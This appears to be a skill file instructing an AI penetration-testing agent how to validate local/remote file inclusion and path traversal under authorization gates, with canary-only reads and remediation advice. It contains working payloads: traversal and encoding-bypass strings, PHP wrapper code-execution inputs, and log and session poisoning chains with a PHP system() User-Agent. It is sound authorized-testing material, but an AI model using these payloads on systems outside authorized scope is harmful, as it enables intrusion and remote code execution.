---
name: vuln-lfi-rfi
description: Path traversal and file inclusion validation — confirm directory traversal and LFI with safe canary files; test PHP wrappers and log-poisoning chains only when scope and destructive-risk approval explicitly authorize them.
disable-model-invocation: true
risk: caution
allowed-modes: [auto, bug-bounty, red-team, ctf, blue-team, offensive, grey-hat, forensic, reverse-engineering, mobile-pentest]
authorization-required: yes
evidence-outputs: [command-log, redacted-evidence, finding-draft]
---

# LFI/RFI — file inclusion and path traversal validation

Use this skill to validate local file inclusion (LFI), remote file inclusion (RFI), and path traversal on an authorized, in-scope target. Confirm that user-controlled file paths can access files outside the intended directory using traversal sequences, encoding bypasses, and PHP wrappers. Read only canary files that prove traversal — `/etc/hostname`, `/proc/version`, or application-owned non-sensitive files. Never read credential files, configuration secrets, source code with database passwords, or user data.

## Required inputs

- Written scope naming the target, authorized file-path parameters (file inclusion, download, template rendering, image loading, log viewing), and explicit permission for path traversal validation.
- Valid authorization cache. Caution risk class: LFI can expose sensitive files — use canary files only. Separate explicit permission required for LFI-to-RCE chains (log poisoning, session poisoning, `/proc/self/environ` injection) or RFI to attacker-controlled hosts.
- Known server OS (Linux, Windows, or unknown) from recon — determines which canary files to probe.
- Known server technology (PHP, Java, Python, Node.js, Ruby) — determines which wrappers and bypasses are relevant.
- List of candidate file-path parameters from recon: `?file=`, `?page=`, `?template=`, `?download=`, `?path=`, `?include=`, `?view=`, `?load=`, `?document=`.

## Required gates

1. `pentest_agent_load_config` → `pentest_agent_validate_policy`.
2. `pentest_agent_parse_scope` → `pentest_agent_validate_target`.
3. `pentest_agent_check_authorization` before any active probe.
4. `pentest_agent_build_command` for dry-run argv preview when catalog tools are useful.
5. `pentest_agent_execute_tool` for execution — never raw shell.
6. `pentest_agent_append_evidence` → `pentest_agent_record_finding` → report.

## Workflow

### Phase 1 — parameter discovery and injection context

Identify the injection context for each file-path parameter:
1. Is the parameter appended to a base path? (`/var/www/templates/<input>` → path traversal needed to escape `/var/www/templates/`.)
2. Is it a bare file path? (`/etc/passwd` → absolute path injection may work.)
3. Is it a filename only with extension appended? (`<input>.php` → null byte or path truncation needed.)
4. Is the parameter used in an include/require statement? (PHP file inclusion — LFI.)
5. Is it used in a file read API? (`fs.readFile`, `open()`, `file_get_contents` — path traversal, not code execution.)

Record the context and the base path (if known) for each parameter.

### Phase 2 — traversal depth discovery

Determine how many directory levels are needed to reach the filesystem root:

```text
Probes (canary file: /etc/hostname or C:\Windows\System32\drivers\etc\hosts):
../etc/hostname
../../etc/hostname
../../../etc/hostname
../../../../etc/hostname
../../../../../etc/hostname
../../../../../../etc/hostname
../../../../../../../etc/hostname
```

For each depth:
1. Request the canary file at the traversal depth.
2. If the response contains the hostname (or Windows hosts file content) → traversal depth confirmed.
3. Record the minimum depth required.
4. Also test absolute paths directly: `/etc/hostname`, `C:\Windows\System32\drivers\etc\hosts`. Some applications accept absolute paths without traversal.

### Phase 3 — encoding bypass

When basic traversal is blocked, test encoding bypasses:

```text
Bypass variants (each tested independently):
URL encoding:         %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhostname
Double URL encoding:  %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fhostname
Unicode/UTF-8:        ..%c0%af..%c0%af..%c0%afetc%c0%afhostname
                      ..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fhostname
Null byte (legacy):   ../../../etc/hostname%00.php
Path normalization:   ....//....//....//etc/hostname    (strip ../ → ....// becomes ../)
Base path bypass:     /var/www/templates/../../../etc/hostname
```

Rules:
- Test one encoding variant at a time.
- If a variant returns the canary file → encoding bypass confirmed.
- Do not enumerate all possible encoding variants — one successful bypass is sufficient.

### Phase 4 — PHP wrapper exploitation (PHP targets only)

When the target is PHP and path traversal is confirmed, test PHP stream wrappers:

**php://filter (read arbitrary files as Base64)**:
```text
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=../../../etc/hostname
```
If the response is Base64-encoded → PHP filter wrapper works. Decode to confirm content. Use this only on application-owned files — never read `/etc/passwd`, `/etc/shadow`, `.env`, or configuration files with secrets.

**data:// wrapper (code execution)**:
```text
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```
This executes PHP code if the `data://` wrapper is enabled. **Requires destructive-risk maintainer approval.** Only test with `id` as the command — never run destructive commands.

**expect:// wrapper (command execution)**:
```text
expect://id
```
This executes system commands via the expect extension. Rarely enabled. **Requires destructive-risk maintainer approval.**

Without destructive-risk approval, document "PHP wrappers enabled — code execution via data:// or expect:// may be possible" and stop.

### Phase 5 — LFI-to-RCE chain assessment

When path traversal is confirmed and the target is PHP:

**Log poisoning**:
1. Inject PHP code into a server log: send a request with `User-Agent: <?php system('id'); ?>`.
2. Include the access log file: `../../../var/log/apache2/access.log` or `../../../var/log/nginx/access.log`.
3. If the PHP code executes and `id` output appears → LFI-to-RCE via log poisoning confirmed.

**Session poisoning**:
1. Create a PHP session containing `<?php system('id'); ?>` via a controlled session variable.
2. Include the session file: `../../../tmp/sess_<session_id>`.
3. If the PHP code executes → LFI-to-RCE via session poisoning confirmed.

**/proc/self/environ (Linux)**:
1. Send a request with `User-Agent: <?php system('id'); ?>`.
2. Include `/proc/self/environ`.
3. If the User-Agent value is reflected and PHP executes → LFI-to-RCE confirmed.

All LFI-to-RCE chains require destructive-risk maintainer approval. Without approval, document "path traversal confirmed — LFI-to-RCE chain via <method> may be possible" and stop.

## Decision points

- **Stop at first confirmed traversal**: one canary file read is sufficient proof. Do not enumerate the filesystem.
- **Escalate on PHP filter wrapper**: if `php://filter` allows reading arbitrary files → the attacker can read application source code and configuration. High severity, even without RCE.
- **Escalate on LFI-to-RCE**: if log/session/environ poisoning achieves code execution → critical severity.
- **Downgrade on restricted traversal**: if traversal only reaches a limited directory (e.g., only within `/var/www/templates/`), document the directory boundary.
- **RFI boundary**: remote file inclusion (including `http://` or `ftp://` URLs) is a distinct vulnerability class. Test only if scope explicitly authorizes RFI.

## Prohibited behavior

- Reading credential files: `/etc/passwd`, `/etc/shadow`, `.env`, `config.php`, `database.yml`, `settings.py`, private keys, or any file containing passwords, API keys, or tokens.
- Reading source code files beyond what is needed to confirm the vulnerability (one canary read is sufficient).
- Reading user data, PII, session files of real users, or database files.
- Using `data://`, `expect://`, or LFI-to-RCE chains without destructive-risk approval.
- Writing files, modifying server state, or chaining LFI with file upload to achieve RCE without explicit scope and approval.

## Stop conditions

- Canary file (`/etc/hostname`, `/proc/version`, or `C:\Windows\System32\drivers\etc\hosts`) returned in response → traversal confirmed, stop testing that parameter.
- PHP filter wrapper returns Base64 → file-read capability confirmed, stop.
- LFI-to-RCE chain executes `id` → RCE confirmed, critical finding, stop.
- All traversal depths and encoding bypasses consistently return error/no content → negative result, document.
- WAF blocks traversal sequences, rate limiting, or detection-team contact.

## Evidence — traversal matrix

For each tested parameter, record:

```text
Parameter: <parameter name> | endpoint: <URL>
Injection context: <appended to base path /var/www/ | bare path | filename with extension>
OS: <Linux | Windows | unknown>
Traversal depth required: <3 | 4 | 5 | absolute path>
Canary file read: <yes (/etc/hostname) | yes (/proc/version) | yes (C:\Windows\...) | no>
Encoding bypass required: <none | URL encoding | double encoding | unicode | null byte>
PHP filter wrapper works: <yes | no | not PHP target>
LFI-to-RCE chain tested: <none | log poisoning | session poisoning | /proc/self/environ>
Code execution confirmed: <yes (id) | no | not tested (no approval)>
Impact: <none | path traversal confirmed | file read via php://filter | LFI-to-RCE confirmed>
Confidence: <confirmed | likely | needs-review>
```

Aggregate into a parameter × traversal-method matrix. Never store: content of read files beyond canary files, Base64-decoded source code containing secrets, `/proc/self/environ` output with environment variables, or log/session files containing PHP code.

## Report handoff

When a finding is confirmed:
1. `pentest_agent_record_finding` with affected parameter, traversal depth/bipass, CVSS estimate (5.3–7.5 for path traversal, 7.5–8.5 for file-read via PHP filter, 9.0–10.0 for LFI-to-RCE), and remediation guidance.
2. Reference the traversal matrix.
3. Recommend: use an allowlist of permitted file paths, validate input against path traversal sequences (reject `..` and encoded variants), use `basename()` or equivalent to discard directory components, restrict file operations to a chroot or sandboxed directory, disable unnecessary PHP wrappers (`allow_url_include=Off`, disable `data://` and `expect://`), run the application with minimal file-system permissions, and run LFI tests in CI.
